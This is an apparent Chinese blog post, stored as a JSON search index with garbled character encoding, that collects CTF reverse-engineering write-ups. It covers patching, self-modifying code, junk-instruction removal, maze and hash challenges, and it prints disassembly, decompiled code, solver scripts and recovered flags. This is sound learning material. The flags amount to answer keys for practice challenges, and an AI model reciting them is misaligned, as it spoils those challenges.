* i); HIDWORD(v6) = v0; while ( v6 \u003e 0 ) { v2[v8++] = v6 % 2; v6 /= 2i64; } for ( j = 50; j \u003e= 0; --j ) { if ( v2[j] ) { if ( v2[j] == 1 ) { putchar(42); ++v7; } } else { putchar(32); ++v7; } if ( !(v7 % 5) ) putchar(32); } result = putchar(10); } return result; } ä»æ„Ÿè§‰ä¸Šæ¥è¯´ä¸€èˆ¬èƒ½çœ‹æ‡‚çš„éƒ½æ˜¯æœ‰ç”¨çš„ï¼Œç„¶è€ŒæŒ‰xæŸ¥äº¤å‰å¼•ç”¨çš„æ—¶å€™å´æ˜¾ç¤ºæ²¡æœ‰åœ°æ–¹è°ƒç”¨å®ƒ äºæ˜¯ç›²çŒœå‰é¢æ²¡å•¥ç”¨çš„å„ç§timeå‡½æ•°å°±æ˜¯è®©æˆ‘patchçš„ï¼Œæä»–ï¼ˆæˆ‘è¿™é‡Œæ”¹äº†ç¬¬11è¡Œ .text:00401725 push ebp .text:00401726 mov ebp, esp .text:00401728 and esp, 0FFFFFFF0h .text:0040172B sub esp, 400h .text:00401731 call ___main .text:00401736 lea eax, [esp+400h+var_3F0] .text:0040173A mov [esp+400h+Time], eax ; Time .text:0040173D call _time .text:00401742 lea eax, [esp+400h+var_3F0] .text:00401746 mov [esp+400h+Time], eax ; Time .text:00401749 call _ques ; Keypatch modified this from: .text:00401749 ; call _localtime .text:0040174E mov [esp+400h+var_4], eax .text:00401755 mov [esp+400h+Time], offset Buffer ; \"Can you find me?\\n\" .text:0040175C call _puts .text:00401761 mov [esp+400h+Time], offset Command ; \"pause\" .text:00401768 call _system .text:0040176D mov eax, 0 .text:00401772 leave .text:00401773 retn applyä¸€ä¸‹ï¼Œç„¶åé‡æ–°è¿è¡Œexeï¼ŒæˆåŠŸï¼ ç¬¬äºŒå‘¨ 2021-11-05 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:16:1","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—00 ä» CNSS å·æ¥çš„ SMC SMCæ˜¯ä»€ä¹ˆ? çœ‹å®Œtipså°è¯•ä¸€ä¸‹ stringçª—å£å®šä½ä¸»å‡½æ•° .text:00408ACE push offset aPleaseInputYou ; \"Please input your code(less than 30 cha\"... .text:00408AD3 call sub_404629 .text:00408AD8 add esp, 4 .text:00408ADB push 64h ; 'd' .text:00408ADD push offset unk_4DFEF8 .text:00408AE2 push offset aS ; \"%s\" .text:00408AE7 call sub_4023EC .text:00408AEC add esp, 0Ch .text:00408AEF push offset loc_408B06 .text:00408AF4 push 138h .text:00408AF9 push offset loc_408B06 .text:00408AFE call sub_4022AC .text:00408B03 add esp, 0Ch å®šä½é—®é¢˜å‡½æ•°sub_4022AC int __cdecl sub_4088D0(int a1, int a2, int a3) { int result; // eax int i; // [esp+D0h] [ebp-8h] for ( i = 0; ; ++i ) { result = i; if ( i \u003e= a2 ) break; *(_BYTE *)(i + a3) = byte_4DF000 ^ *(_BYTE *)(i + a1); } return result; } idaPython æä»– from ida_bytes import * for i in range(0x138): patch_byte(0x408B06+i,get_byte(0x408B06+i)^74) æŒ‰ç…§æ­¥éª¤æ¥åˆ°å‡½æ•°å¤´CreatFonctionï¼Œç»“æœå°±å‡ºé—®é¢˜äº† æŠ¥é”™ .text:00408B19: The function has undefined instruction/data at the specified address. Your request has been put in the autoanalysis queue. å¼€å§‹ä»¥ä¸ºæ˜¯å‰é¢å“ªé‡Œåšé”™äº†ï¼Œåˆé‡å¤äº†å‡ éï¼Œä¸€æ ·çš„ç»“æœ è¯·æ•™RXå¤§ç¥å‘ç°é—®é¢˜ .text:00408B06 mov dword ptr [ebp-0Ch], 1 .text:00408B0D mov dword ptr [ebp-8], 1 .text:00408B14 push 4DFEF8h .text:00408B14 ; --------------------------------------------------------------------------- .text:00408B19 db 0E8h .text:00408B1A retn 0FF95h .text:00408B1A ; --------------------------------------------------------------------------- .text:00408B1D db 0FFh è¿™é‡Œidaè¯†åˆ«é”™äº† æŒ‰cé‡æ–°è¯†åˆ«ä¸ºcodeï¼Œä¸€åˆ‡æ­£å¸¸äº† é‡æ–°CreateFunctionæ¥F5ç»ˆäºçœ‹åˆ°ä¸»å‡½æ•° int __cdecl main_0(int argc, const char **argv, const char **envp) { signed int j; // [esp+D4h] [ebp-3Ch] int i; // [esp+E0h] [ebp-30h] char v6; // [esp+EFh] [ebp-21h] signed int v7; // [esp+F8h] [ebp-18h] int v8; // [esp+104h] [ebp-Ch] int v9; // [esp+108h] [ebp-8h] sub_404629(\"Please input your code(less than 30 characters): \"); sub_4023EC(\"%s\", Str); sub_4022AC((int)\u0026loc_408B06, 312, (int)\u0026loc_408B06); v8 = 1; v9 = 1; v7 = j__strlen(Str); v6 = 0; if ( v7 == 23 ) { for ( i = 0; i \u003c 23; ++i ) { switch ( Str[i] ) { case 'a': --v9; break; case 'd': ++v9; break; case 's': ++v8; break; case 'w': --v8; break; default: break; } if ( aSE[8 * v8 + v9] == 35 ) break; if ( aSE[8 * v8 + v9] == 69 ) { v6 = 1; break; } } } if ( v6 ) { for ( j = 0; j \u003c v7; ++j ) byte_4DF04C[j] ^= Str[j]; sub_404629(\"%s\\n\"); } j__system(\"pause\"); return 0; } ç»å…¸åœ°å›¾é¢˜,aSEæ•°ç»„å­˜åœ°å›¾ï¼ŒåŠ å›è½¦å¾—åœ°å›¾ ######## #S # # ## # # ##### # # ## # ####E# # # ######## w s a dååˆ†äººæ€§åŒ–ï¼Œå¥½è¯„ ç¬¬ä¸€æ¬¡ç”¨pyå†™è„šæœ¬ key = \"dsddwddssasaaaassdddddw\" magic = [39, 61, 55, 55, 12, 33, 5, 70, 10, 62, 32, 44, 34, 62,71, 44, 18, 59, 41, 5, 86, 1, 10] for i in range(0,23): print( chr( magic[i] ^ ord(key[i]) ), end=\"\") # CNSS{Ea5y_SMC_\u0026_a_Ma2e} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:17:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—01 ByteCTF 2020 AWD TikTokAdmin ç®€å•èŠ±æŒ‡ä»¤ é¢˜ç›®åŠé€€ï¼Œå­¦ä¹ äº†ä¸€æ³¢èŠ±æŒ‡ä»¤æ˜¯å•¥å†æ¥åšé¢˜ æ ¹æ®é¢˜ç›®ï¼Œåœ¨stringçª—å£æŸ¥æ‰¾Deleteï¼Œæ‰¾åˆ°äº†å‘ç”Ÿé”™è¯¯çš„éƒ¨åˆ† .text:00000000000080D4 loc_80D4: ; CODE XREF: .text:000000000000805Câ†‘j .text:00000000000080D4 lea rsi, aWeNeedToReconf ; \"We need to reconfirm the authority!\" .text:00000000000080DB lea rdi, _ZSt4cout ; std::cout .text:00000000000080E2 call __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(std::ostream \u0026,char const*) .text:00000000000080E7 mov rdx, rax .text:00000000000080EA mov rax, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr .text:00000000000080F1 mov rsi, rax .text:00000000000080F4 mov rdi, rdx .text:00000000000080F7 call __ZNSolsEPFRSoS_E ; std::ostream::operator\u003c\u003c(std::ostream \u0026 (*)(std::ostream \u0026)) .text:00000000000080FC lea rsi, aPleaseInputThe ; \"Please input the super root's password:\"... .text:0000000000008103 mov rdi, rax .text:0000000000008106 call __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(std::ostream \u0026,char const*) .text:000000000000810B lea rax, [rbp-90h] .text:0000000000008112 mov rsi, rax .text:0000000000008115 lea rdi, _ZSt3cin ; std::cin .text:000000000000811C call __ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE ; std::operator\u003e\u003e\u003cchar\u003e(std::istream \u0026,std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e \u0026) .text:0000000000008121 jz short near ptr loc_8125+1 .text:0000000000008123 jnz short near ptr loc_8125+1 .text:0000000000008125 .text:0000000000008125 loc_8125: ; CODE XREF: .text:0000000000008121â†‘j .text:0000000000008125 ; .text:0000000000008123â†‘j .text:0000000000008125 call near ptr 70860E72h .text:0000000000008125 ; --------------------------------------------------------------------------- .text:000000000000812A dw 0FFFFh, 48FFh, 0C789h .text:0000000000008130 dq 0C38948FFFFB56BE8h, 48FFFFFF70858D48h, 48FFFFB489E8C789h .text:0000000000008130 dq 8948B0458D48C189h, 0E8C78948CE8948DAh, 0B0458D48FFFFB584h .text:0000000000008130 dq 358D480000000DBAh, 0E8C7894800007B1Dh, 840FC085FFFFB48Ch .text:0000000000008130 dq 14358D48000000F6h, 0DEF63D8D4800007Bh, 48FFFFB5E1E80000h .text:0000000000008130 dq 8948B0458D48C289h, 0FFB5CFE8D78948C6h, 7AFD358D48FFh é—®é¢˜å‡ºåœ¨äº†jzï¼ˆä¸º0è·³è½¬ï¼‰å’Œjnzï¼ˆä¸ä¸º0è·³è½¬ï¼‰åŒæ—¶å­˜åœ¨ï¼Œå¹¶æ’å…¥äº†0xE8ï¼ˆcallçš„æœºå™¨ç ï¼‰ä½¿idaè¯†åˆ«å‡ºé”™ è§£å†³æ–¹æ³•å…ˆæŠŠcallæŒ‰uæ”¹æˆæœªå®šä¹‰,æ•ˆæœå¦‚å›¾ .text:0000000000008125 db 0E8h .text:0000000000008126 unk_8126 db 48h ; H ; CODE XREF: .text:0000000000008121â†‘j .text:0000000000008126 ; .text:0000000000008123â†‘j .text:0000000000008127 db 8Dh .text:0000000000008128 db 85h .text:0000000000008129 db 70h ; p .text:000000000000812A dw 0FFFFh, 48FFh, 0C789h ç„¶åæŠŠ0xE8 patchæˆnopï¼ˆç©ºï¼‰ï¼Œå…¶ä»–æ•°æ®æŒ‰cé‡æ–°åˆ†ææˆä»£ç  .text:0000000000008123 ; --------------------------------------------------------------------------- .text:0000000000008125 db 90h ; Keypatch modified this from: .text:0000000000008125 ; db 0E8h .text:0000000000008125 ; Keypatch padded NOP to next boundary: 1 bytes .text:0000000000008126 ; --------------------------------------------------------------------------- .text:0000000000008126 .text:0000000000008126 loc_8126: ; CODE XREF: .text:0000000000008121â†‘j .text:0000000000008126 ; .text:0000000000008123â†‘j .text:0000000000008126 lea rax, [rbp-90h] .text:000000000000812D mov rdi, rax .text:0000000000008130 call __ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE4sizeEv ; std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e::size(void) .text:0000000000008135 mov rbx, rax .text:0000000000008138 lea rax, [rbp-90h] .text:000000000000813F mov rdi, rax .text:0000000000008142 call __ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv ; std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e::c_str(void) .text:0000000000008147 mov rcx, rax .text:000000000000814A lea rax, [rbp-50h] .text:000000000000814E mov rdx, rbx .text:0000000000008151 mov rsi, rcx ç„¶åå‘ç°ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªä¸€æ ·çš„é”™è¯¯ï¼Œç›¸åŒåŠæ³•è§£å†³ æœ€åæ¥åˆ°å‡½æ•°å¤´Create Functionï¼Œ å®Œäº‹ååˆ°è™šæ‹Ÿæœºä¸Šçœ‹ä¸€çœ¼ dx3906@","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:18:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—02 BJDCTF 2020 è€å…«çš„å°æ±‰å ¡ æ¸¸æˆçœŸä¸é”™ï¼Œä½†é¢˜å®è¯è¯´å±äºæ²¡é¢˜è§£ä¸ä¼šåšç³»åˆ—ï¼ˆ ä¸‹äº†ä¸ªdnspyï¼Œæ ¹æ®é¢˜è§£æ‰“å¼€Data/Managedç›®å½•ä¸‹çš„Assembly-CSharp.dll æœç´¢å­—ç¬¦ä¸²â€œç¾æ±æ±â€å®šä½ä¸»å‡½æ•° public class ButtonSpawnFruit : MonoBehaviour { // Token: 0x0600000A RID: 10 RVA: 0x00002110 File Offset: 0x00000310 public static string Md5(string str) { byte[] bytes = Encoding.UTF8.GetBytes(str); byte[] array = MD5.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) { stringBuilder.Append(b.ToString(\"X2\")); } return stringBuilder.ToString().Substring(0, 20); } // Token: 0x0600000B RID: 11 RVA: 0x00002170 File Offset: 0x00000370 public static string Sha1(string str) { byte[] bytes = Encoding.UTF8.GetBytes(str); byte[] array = SHA1.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) { stringBuilder.Append(b.ToString(\"X2\")); } return stringBuilder.ToString(); } // Token: 0x0600000C RID: 12 RVA: 0x000021C8 File Offset: 0x000003C8 public void Spawn() { FruitSpawner component = GameObject.FindWithTag(\"GameController\").GetComponent\u003cFruitSpawner\u003e(); if (component) { if (this.audioSources.Length != 0) { this.audioSources[Random.Range(0, this.audioSources.Length)].Play(); } component.Spawn(this.toSpawn); string name = this.toSpawn.name; if (name == \"æ±‰å ¡åº•\" \u0026\u0026 Init.spawnCount == 0) { Init.secret += 997; } else if (name == \"é¸­å±è‚¡\") { Init.secret -= 127; } else if (name == \"èƒ¡ç½—è´\") { Init.secret *= 3; } else if (name == \"è‡­è±†è…\") { Init.secret ^= 18; } else if (name == \"ä¿˜è™\") { Init.secret += 29; } else if (name == \"ç™½æ‹†\") { Init.secret -= 47; } else if (name == \"ç¾æ±æ±\") { Init.secret *= 5; } else if (name == \"æŸ æª¬\") { Init.secret ^= 87; } else if (name == \"æ±‰å ¡é¡¶\" \u0026\u0026 Init.spawnCount == 5) { Init.secret ^= 127; string str = Init.secret.ToString(); if (ButtonSpawnFruit.Sha1(str) == \"DD01903921EA24941C26A48F2CEC24E0BB0E8CC7\") { this.result = \"BJDCTF{\" + ButtonSpawnFruit.Md5(str) + \"}\"; Debug.Log(this.result); } } Init.spawnCount++; Debug.Log(Init.secret); Debug.Log(Init.spawnCount); } } åŸºæœ¬æ€è·¯æ˜¯å·²çŸ¥sha1(str)==DD01903921EA24941C26A48F2CEC24E0BB0E8CC7,æ±‚md5(str) è¿˜æ˜¯æ ¹æ®é¢˜è§£ä¸Šcmd5.comå¾—str==1001 ç„¶åmd5åŠ å¯†ï¼Œæ³¨æ„è¿™ä¸€å¥ï¼Œå–åŠ å¯†åçš„0-20ï¼ˆä¸åŒ…æ‹¬20ï¼‰å³å‰20ä½ï¼ˆå‰äººä¹‹é‰´å±äºæ˜¯ return stringBuilder.ToString().Substring(0, 20) ipythonè·‘ä¸€éå¾—flag In [1]: from hashlib import md5 In [2]: a=md5() In [3]: a.update(b\"1001\") In [4]: print(\"BJDCTF{\"+a.hexdigest()[:20]+\"}\") BJDCTF{b8c37e33defde51cf91e} æ€»ç»“ï¼šè¿™å‘¨é¢˜çœŸæ˜¯ç»™æˆ‘å¼€çœ¼ç•Œçš„ï¼ˆ ç¬¬ä¸€å‘¨ 2021-10-31 å†™åœ¨å‰é¢ï¼š æ–°äººç¬¬ä¸€æ¬¡å‘å¸–ï¼Œå¤šå¤šæŒ‡æ•™ é•¿ç¯‡å¹…è­¦å‘Šï¼Œå†™å¾—æ¯”è¾ƒç¹ç ä¸»è¦è®°å½•è‡ªå·±çš„åšé¢˜è¿‡ç¨‹ï¼Œå½“ç„¶è¿˜æœ‰æ°´æ°´æ°´ ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:19:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x00 DMCTF 2020 re1 æ¥ç‚¹ç®€å•çš„ç®—æ³•ç”œç‚¹ è§£å‹ååªæœ‰ä¸€ä¸ªexeæ–‡ä»¶ï¼Œå…ˆè¿è¡Œçœ‹çœ‹ æç¤ºè¾“å…¥flagï¼Œä¹±è¾“æç¤º wrong flagï¼ flag:134123421 wrong flag! è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . . æ‹–è¿›dieï¼Œæ— å£³ï¼Œè¿›ida çœ‹ä¸æ‡‚æ±‡ç¼–ï¼Œç›´æ¥F5ï¼Œè¿›main_0å‡½æ•° int __cdecl main_0(int argc, const char **argv, const char **envp) { char Str; // [esp+DCh] [ebp-40h] BYREF char v5[54]; // [esp+DDh] [ebp-3Fh] BYREF __CheckForDebuggerJustMyCode(\u0026unk_5E0029); Str = 0; j__memset(v5, 0, sizeof(v5)); sub_485257(\"flag:\"); sub_484CF3(\u0026dword_5DD268, \u0026Str); if ( sub_485D1A(\u0026Str) ) sub_4849EC(\u0026Str); else sub_485257(\"wrong flag!\\n\"); sub_488209(\"pause\"); return 0; } å‘ç°æœ‰ç”¨çš„ä¸»è¦åœ¨if else å…ˆè¿›ifåˆ¤æ–­æ¡ä»¶å‡½æ•°sub_485D1A BOOL __cdecl sub_49BE80(char *Str) { __CheckForDebuggerJustMyCode(\u0026unk_5E0029); return j__strlen(Str) == 20; } ç¬¬ä¸€è¡Œçœ‹ä¸æ‡‚ä¹Ÿæ„Ÿè§‰æ²¡ç”¨ï¼Œç›´æ¥å¿½ç•¥ï¼Œç¬¬äºŒè¡Œé™åˆ¶è¾“å…¥ä¸º20ä¸ªå­—ç¬¦ å›æ¥å†è¿›ifä¸‹å‡½æ•°sub_4849EC int __cdecl sub_49AE10(char *Str1) { int result; // eax int i; // [esp+D0h] [ebp-2Ch] char Str2[28]; // [esp+DCh] [ebp-20h] BYREF __CheckForDebuggerJustMyCode(\u0026unk_5E0029); strcpy(Str2, \"fmesh{umkc_vlrn_glh}\"); for ( i = 0; i \u003c= 19; ++i ) { if ( Str1[i] \u003c 97 || Str1[i] \u003e= 108 ) { if ( Str1[i] \u003e 110 \u0026\u0026 Str1[i] \u003c= 122 ) --Str1[i]; } else { Str1[i] += 2; } } if ( !j__strcmp(Str1, Str2) ) result = sub_485257(\"congratulations!\\n\"); else result = sub_485257(\"wrong flag!\\n\"); return result; } å‘ç°æ˜¯ä¸ªç®€å•çš„åŠ å¯† åŠ æ”¹æˆå‡ï¼Œå‡æ”¹æˆåŠ ï¼Œé€†å†™å¾—åˆ°flagï¼Œç²˜ä¸ªä»£ç  #include\u003ccstdio\u003e char Str1[]=\"fmesh{umkc_vlrn_glh}\"; int main(){ for(int i=0;i\u003c=19;i++){ if ( Str1[i] \u003c 97 || Str1[i] \u003e= 108 ){ if ( Str1[i] \u003e 110 \u0026\u0026 Str1[i] \u003c= 122 ) Str1[i]++; } else{ Str1[i] -= 2; } } puts(Str1); } //flag:dmctf{vmia_wlsn_elf} ç„¶è€Œæ®è¯´è¿™é¢˜å¤šè§£ï¼Œå’±ä¹Ÿä¸çŸ¥é“ï¼Œå’±ä¹Ÿä¸æ•¢é—® ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:20:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 DMCTF 2020 re4 â€œæœ€çŸ­è·¯å¾„â€ ç›´æ¥æ‰“å¼€exeï¼Œè¾“å…¥keyé—ªé€€å·®è¯„ cmdæ‰“å¼€ C:\\Users\\DX3906\u003eD:\\DX3906\\ä¸‹è½½\\12345\\12345.exe key:1234123 failed. failed. failed. failed. failed. failed. failed. failed. 8ä¸ªfailedç›´å‘¼å¥½ç‹  dieæŸ¥å£³ï¼šæ— ï¼Œæ‹–è¿›ida ç›´æ¥F5ï¼Œæ‰¾ä¸åˆ°ä¸»å‡½æ•° void __noreturn start() { _set_app_type(_crt_console_app); sub_4011B0(); } æ‰“å¼€stringçª—å£ .rdata:00405000 00000013 C libgcc_s_dw2-1.dll .rdata:00405013 00000016 C __register_frame_info .rdata:00405029 00000018 C __deregister_frame_info .rdata:00405041 0000000E C libgcj-16.dll .rdata:0040504F 00000014 C _Jv_RegisterClasses .rdata:0040506A 00000008 C failed. .rdata:00405072 0000000A C flag{%s}\\n .rdata:00405080 00000018 C Mingw runtime failure:\\n .rdata:00405098 00000031 C VirtualQuery failed for %d bytes at address %p .rdata:004050CC 00000032 C Unknown pseudo relocation protocol version %d.\\n .rdata:00405100 0000002A C Unknown pseudo relocation bit size %d.\\n æ˜ å…¥çœ¼å¸˜å°±æ˜¯failed ç‚¹ä»–â€”â€” rdata:0040506A Buffer db 'failed.',0 ; DATA XREF: sub_401460:loc_4015A3â†‘o å‘ç°å‡½æ•°sub_401460ï¼Œç‚¹ä»–å¼¹å‡ºæ¥æ±‡ç¼–ï¼Œå†F5ï¼Œç»ˆäºè¿›äº†çœŸçš„ä¸»å‡½æ•° int sub_401460() { int v0; // eax char Buffer[51]; // [esp+3Dh] [ebp-43h] BYREF int v3; // [esp+70h] [ebp-10h] int i; // [esp+74h] [ebp-Ch] int v5; // [esp+78h] [ebp-8h] int v6; // [esp+7Ch] [ebp-4h] sub_401BD0(); printf(\"key:\"); fgets(Buffer, 50, (FILE *)iob[0]._ptr); v3 = strlen(Buffer); if ( Buffer[v3 - 1] == 10 ) Buffer[v3 - 1] = 0; --v3; v6 = 0; v5 = 0; for ( i = 0; i \u003c v3; ++i ) { v0 = Buffer[i]; if ( v0 == 0x31 ) { --v5; } else if ( v0 \u003e 49 ) { if ( v0 == 50 ) { ++v6; } else { if ( v0 != 51 ) { LABEL_16: puts(\"failed.\"); goto LABEL_17; } --v6; } } else { if ( v0 != 48 ) goto LABEL_16; ++v5; } LABEL_17: if ( !byte_404020[10 * v6 + v5] || v6 \u003c 0 || v5 \u003c 0 || v6 \u003e 9 || v5 \u003e 9 ) puts(\"failed.\"); } if ( v6 == 9 \u0026\u0026 v5 == 9 ) printf(\"flag{%s}\\n\", Buffer); return 0; } è§‚å¯ŸLABEL_17ä¸­ifçš„åˆ¤æ–­æ¡ä»¶ï¼Œå’‹çœ‹å’‹åƒè¿·å®«é¢˜ï¼Œv6è¡¨ç¤ºè¡Œï¼Œv5è¡¨ç¤ºåˆ—ï¼Œ0-9å…±10è¡Œ10åˆ— è¿›æ•°ç»„byte_404020ï¼Œæ•°æ®éƒ½æ˜¯0å’Œ1ï¼Œæ›´åŠ ç¡®ä¿¡è¿·å®« .data:00404020 byte_404020 db 1 ; DATA XREF: sub_401460+164â†‘r .data:00404021 db 0 .data:00404022 db 0 .data:00404023 db 0 .data:00404024 db 0 .data:00404025 db 1 .data:00404026 db 1 .data:00404027 db 0 .data:00404028 db 0 .data:00404029 db 0 .data:0040402A db 1 .data:0040402B db 1 .data:0040402C db 0 .data:0040402D db 0 .data:0040402E db 0 .data:0040402F db 1 .data:00404030 db 1 .data:00404031 db 1 .data:00404032 db 0 ä½†ï¼Œè¿™è¦æˆ‘ä¸€ä¸ªä¸ªæ‰£å‡ºæ¥ï¼Ÿï¼Ÿ å³é”®é€‰æ‹©Array ç„¶åæŠŠsizeæ”¹æˆ100ï¼ˆ10è¡Œ10åˆ—å…±100ä¸ªæ•° èˆ’æœ~ .data:00404020 byte_404020 db 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1; 0 .data:00404020 ; DATA XREF: sub_401460+164â†‘r .data:00404020 db 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1; 18 .data:00404020 db 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0; 36 .data:00404020 db 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0; 54 .data:00404020 db 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1; 72 .data:00404020 db 0, 0, 0, 0, 0, 0, 0, 0, 0, 1; 90 å¤åˆ¶ç²˜è´´å‡ºè¿·å®« 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, å›å¤´å†çœ‹å‡½æ•° for ( i = 0; i \u003c v3; ++i ) { v0 = Buffer[i]; if ( v0 == 0x31 ) { --v5; } else if ( v0 \u003e 49 ) { if ( v0 == 50 ) { ++v6; } else { if ( v0 != 51 ) { LABEL_16: puts(\"failed.\"); goto LABEL_17; } --v6; } } else { if ( v0 != 48 ) goto LABEL_16; ++v5; } LABEL_17: if ( !byte_404020[10 * v6 + v5] || v6 \u003c 0 || v5 \u003c 0 || v6 \u003e 9 || v5 \u003e 9 ) puts(\"failed.\"); } æ˜“å¾— 0 ++v5 right 1 --v5 left 2 ++v6 down 3 --v6 up æ‰‹åŠ¨èµ°è¿·å®«å¾— key:20220002033330202222202202 å›cmdè¿è¡Œå¾—flag key:20220002033330202222202202 flag{20220002033330202222202202} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:20:1","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x02 GWCTF 2019 xxor å¿«ä¹çš„è§£æ–¹ç¨‹é¢˜ç›® è§£å‹æ‰“å¼€å‘ç°ä¸æ˜¯exeï¼Œæ— æ³•æ‰“å¼€ç›´æ¥æ‹–die å‘ç°æ˜¯elf64ï¼ˆlinuxå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ï¼Œé©¬ä¸Šå»å¼€è™šæ‹Ÿæœº ubuntué‡Œå…ˆè¿è¡Œä¸€ä¸‹ dx3906@ubuntu:~/Desktop$ '/home/dx3906/attachment' Let us play a game? you have six chances to input Come on! input: 1231212 input: 3 input: 12 input: 3 input: 12 input: 3 Wrong! NO NO NO~ å‘ç°é¢˜ç›®éœ€è¦è¾“å…¥å…­æ¬¡ï¼Œæ‹–ida F5 åœ¨å·¦è¾¹Functions Windowæ‰¾åˆ°äº†mainå‡½æ•°ï¼Œç«Ÿç„¶æ˜¯çœŸçš„ __int64 __fastcall main(int a1, char **a2, char **a3) { int i; // [rsp+8h] [rbp-68h] int j; // [rsp+Ch] [rbp-64h] __int64 v6[6]; // [rsp+10h] [rbp-60h] BYREF __int64 v7[6]; // [rsp+40h] [rbp-30h] BYREF v7[5] = __readfsqword(0x28u); puts(\"Let us play a game?\"); puts(\"you have six chances to input\"); puts(\"Come on!\"); v6[0] = 0LL; v6[1] = 0LL; v6[2] = 0LL; v6[3] = 0LL; v6[4] = 0LL; for ( i = 0; i \u003c= 5; ++i ) { printf(\"%s\", \"input: \"); __isoc99_scanf(\"%d\", (char *)v6 + 4 * i); } v7[0] = 0LL; v7[1] = 0LL; v7[2] = 0LL; v7[3] = 0LL; v7[4] = 0LL; for ( j = 0; j \u003c= 2; ++j ) { dword_601078 = v6[j]; dword_60107C = HIDWORD(v6[j]); sub_400686(\u0026dword_601078, \u0026unk_601060); LODWORD(v7[j]) = dword_601078; HIDWORD(v7[j]) = dword_60107C; } if ( (unsigned int)sub_400770(v7) != 1 ) { puts(\"NO NO NO~ \"); exit(0); } puts(\"Congratulation!\\n\"); puts(\"You seccess half\\n\"); puts(\"Do not forget to change input to hex and combine~\\n\"); puts(\"ByeBye\"); return 0LL; } å€’ç€çœ‹ï¼Œå…ˆè¿›ifé‡Œé¢çš„åˆ¤æ–­å‡½æ•°sub_400770(v7) __int64 __fastcall sub_400770(_DWORD *a1) { __int64 result; // rax if ( a1[2] - a1[3] == 0x84A236FFLL \u0026\u0026 a1[3] + a1[4] == 0xFA6CB703LL \u0026\u0026 a1[2] - a1[4] == 0x42D731A8LL \u0026\u0026 *a1 == 0xDF48EF7E \u0026\u0026 a1[5] == 0x84F30420 \u0026\u0026 a1[1] == 0x20CAACF4 ) { puts(\"good!\"); result = 1LL; } else { puts(\"Wrong!\"); result = 0LL; } return result; } æœç„¶å¦‚é¢˜ç›®è§£æ–¹ç¨‹ï¼Œz3æå®ƒ 